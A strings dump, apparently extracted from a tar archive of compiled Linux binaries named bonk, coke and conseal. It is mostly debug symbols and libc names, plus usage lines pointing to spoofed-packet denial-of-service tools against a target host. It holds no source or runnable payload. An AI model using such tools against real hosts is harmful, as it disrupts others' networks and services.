            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "boink.c",
            "ip_bytes.6",
            "iplen",
            "_DYNAMIC",
            "quit",
            "host_to_ip",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "datalen",
            "usage",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "_init",
            "spf_sck",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "setsockopt@@GLIBC_2.0",
            "psize",
            "udplen",
            "_start",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "fondle",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "memset@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/bonk",
            "0100755",
            "0000000",
            "0000000",
            "00000033275",
            "07100656572",
            "013031",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "memcpy",
            "perror",
            "socket",
            "fprintf",
            "__deregister_frame_info",
            "setsockopt",
            "sendto",
            "memset",
            "gethostbyname",
            "stderr",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRh\u050a",
            "QVh8",
            "1*EP",
            "Pz Ej",
            "]U(E5",
            "P. }",
            "E;E|",
            "EPEPEPEP",
            " E\u0283h",
            "\u0403;u[]",
            "Usage: ./bonk <src_addr> <dst_addr> [num]",
            "bad source host",
            "bad target host",
            "socket()",
            "IP_HDRINCL",
            "Done.",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "bonk.c",
            "ip_bytes.6",
            "iplen",
            "_DYNAMIC",
            "quit",
            "host_to_ip",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "datalen",
            "usage",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "_init",
            "spf_sck",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "setsockopt@@GLIBC_2.0",
            "psize",
            "udplen",
            "_start",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "fondle",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "memset@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/coke",
            "0100755",
            "0000000",
            "0000000",
            "00000034355",
            "07100657122",
            "013011",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "connect",
            "perror",
            "malloc",
            "socket",
            "bzero",
            "fprintf",
            "strcat",
            "__deregister_frame_info",
            "sendto",
            "bcopy",
            "gethostbyname",
            "stderr",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "strlen",
            "__register_frame_info",
            "close",
            "free",
            "GLIBC_2.0",
            "1^PTRh",
            "t/=|",
            ":4t&",
            "\u0403;u[]",
            "just a bunch of crap really does not matter",
            "+0.34",
            "coke %s     crank|phuzz",
            "sending packet: %d (%c)",
            "sending packet: %d (caffine will kill you)",
            "coke: gethostbyname()",
            "coke: socket()",
            "coke %s     crank|phuzz",
            "usage: %s <target> <number of packets to send>",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "coke.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "usage",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "countstr",
            "twirly",
            "bcopy@@GLIBC_2.0",
            "_init",
            "malloc@@GLIBC_2.0",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "_start",
            "strlen@@GLIBC_2.0",
            "sendPacket",
            "__bss_start",
            "main",
            "blah",
            "__libc_start_main@@GLIBC_2.0",
            "strcat@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "count",
            "_fini",
            "twirl",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "free@@GLIBC_2.0",
            "_end",
            "htons@@GLIBC_2.0",
            "connect@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/conseal",
            "0100755",
            "0000000",
            "0000000",
            "00000011650",
            "07061546647",
            "013524",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "putchar",
            "printf",
            "perror",
            "socket",
            "fprintf",
            "__deregister_frame_info",
            "setsockopt",
            "sendto",
            "bcopy",
            "gethostbyname",
            "sprintf",
            "stderr",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "GLIBC_2.0",
            "1^PTRh",
